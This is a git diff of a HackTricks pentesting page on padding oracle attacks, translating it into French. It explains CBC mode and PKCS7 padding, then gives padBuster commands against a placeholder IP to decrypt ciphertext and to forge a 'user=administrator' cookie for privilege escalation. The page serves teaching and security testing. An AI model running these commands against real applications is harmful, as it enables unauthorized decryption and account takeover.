@@ -1,40 +1,40 @@
 # Padding Oracle
 
 {% hint style="success" %}
-Learn & practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
-Learn & practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Apprenez et pratiquez le hacking AWS :<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
+Apprenez et pratiquez le hacking GCP : <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Support HackTricks</summary>
 
-* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
+* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.
 
 </details>
 {% endhint %}
 
 {% embed url="https://websec.nl/" %}
 
-## CBC - Cipher Block Chaining
+## CBC - Chiffrement par blocs en chaîne
 
-In CBC mode the **previous encrypted block is used as IV** to XOR with the next block:
+En mode CBC, le **bloc chiffré précédent est utilisé comme IV** pour XOR avec le bloc suivant :
 
 ![https://defuse.ca/images/cbc\_encryption.png](https://defuse.ca/images/cbc\_encryption.png)
 
-To decrypt CBC the **opposite** **operations** are done:
+Pour déchiffrer en CBC, les **opérations opposées** sont effectuées :
 
 ![https://defuse.ca/images/cbc\_decryption.png](https://defuse.ca/images/cbc\_decryption.png)
 
-Notice how it's needed to use an **encryption** **key** and an **IV**.
+Remarquez qu'il est nécessaire d'utiliser une **clé de chiffrement** et un **IV**.
 
-## Message Padding
+## Remplissage de message
 
-As the encryption is performed in **fixed** **size** **blocks**, **padding** is usually needed in the **last** **block** to complete its length.\
-Usually **PKCS7** is used, which generates a padding **repeating** the **number** of **bytes** **needed** to **complete** the block. For example, if the last block is missing 3 bytes, the padding will be `\x03\x03\x03`.
+Comme le chiffrement est effectué en **blocs de taille fixe**, un **remplissage** est généralement nécessaire dans le **dernier bloc** pour compléter sa longueur.\
+Généralement, **PKCS7** est utilisé, ce qui génère un remplissage **répétant** le **nombre** de **bytes** **nécessaires** pour **compléter** le bloc. Par exemple, si le dernier bloc manque de 3 bytes, le remplissage sera `\x03\x03\x03`.
 
-Let's look at more examples with a **2 blocks of length 8bytes**:
+Examinons plus d'exemples avec **2 blocs de longueur 8bytes** :
 
 | byte #0 | byte #1 | byte #2 | byte #3 | byte #4 | byte #5 | byte #6 | byte #7 | byte #0  | byte #1  | byte #2  | byte #3  | byte #4  | byte #5  | byte #6  | byte #7  |
 | ------- | ------- | ------- | ------- | ------- | ------- | ------- | ------- | -------- | -------- | -------- | -------- | -------- | -------- | -------- | -------- |
@@ -43,17 +43,17 @@ Let's look at more examples with a **2 blocks of length 8bytes**:
 | P       | A       | S       | S       | W       | O       | R       | D       | 1        | 2        | 3        | **0x05** | **0x05** | **0x05** | **0x05** | **0x05** |
 | P       | A       | S       | S       | W       | O       | R       | D       | **0x08** | **0x08** | **0x08** | **0x08** | **0x08** | **0x08** | **0x08** | **0x08** |
 
-Note how in the last example the **last block was full so another one was generated only with padding**.
+Notez comment dans le dernier exemple, le **dernier bloc était plein donc un autre a été généré uniquement avec du remplissage**.
 
 ## Padding Oracle
 
-Lorsque qu'une application déchiffre des données chiffrées, elle déchiffre d'abord les données ; puis elle supprime le padding. Lors du nettoyage du padding, si un **padding invalide déclenche un comportement détectable**, vous avez une **vulnérabilité de padding oracle**. Le comportement détectable peut être une **erreur**, un **manque de résultats**, ou une **réponse plus lente**.
+Lorsqu'une application déchiffre des données chiffrées, elle déchiffre d'abord les données ; puis elle supprime le remplissage. Pendant le nettoyage du remplissage, si un **remplissage invalide déclenche un comportement détectable**, vous avez une **vulnérabilité de padding oracle**. Le comportement détectable peut être une **erreur**, un **manque de résultats**, ou une **réponse plus lente**.
 
 Si vous détectez ce comportement, vous pouvez **déchiffrer les données chiffrées** et même **chiffrer n'importe quel texte clair**.
 
-### How to exploit
+### Comment exploiter
 
-Vous pourriez utiliser [https://github.com/AonCyberLabs/PadBuster](https://github.com/AonCyberLabs/PadBuster) pour exploiter ce type de vulnérabilité ou juste faire
+Vous pourriez utiliser [https://github.com/AonCyberLabs/PadBuster](https://github.com/AonCyberLabs/PadBuster) pour exploiter ce type de vulnérabilité ou simplement faire
 ```
 sudo apt-get install padbuster
 ```
@@ -63,7 +63,7 @@ perl ./padBuster.pl http://10.10.10.10/index.php "RVJDQrwUdTRWJUVUeBKkEA==" 8 -e
 ```
 **L'encodage 0** signifie que **base64** est utilisé (mais d'autres sont disponibles, consultez le menu d'aide).
 
-Vous pourriez également **exploiter cette vulnérabilité pour chiffrer de nouvelles données. Par exemple, imaginez que le contenu du cookie est "**_**user=MyUsername**_**", alors vous pouvez le changer en "\_user=administrator\_" et élever les privilèges à l'intérieur de l'application. Vous pourriez également le faire en utilisant `paduster` en spécifiant le paramètre -plaintext** :
+Vous pourriez également **abuser de cette vulnérabilité pour chiffrer de nouvelles données. Par exemple, imaginez que le contenu du cookie est "**_**user=MyUsername**_**", alors vous pouvez le changer en "\_user=administrator\_" et escalader les privilèges à l'intérieur de l'application. Vous pourriez également le faire en utilisant `paduster` en spécifiant le paramètre -plaintext** :
 ```bash
 perl ./padBuster.pl http://10.10.10.10/index.php "RVJDQrwUdTRWJUVUeBKkEA==" 8 -encoding 0 -cookies "login=RVJDQrwUdTRWJUVUeBKkEA==" -plaintext "user=administrator"
 ```
@@ -122,7 +122,7 @@ Apprenez et pratiquez le hacking GCP : <img src="../.gitbook/assets/grte.png" al
 
 <summary>Soutenir HackTricks</summary>
 
-* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
+* Vérifiez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
 * **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
 * **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.
 
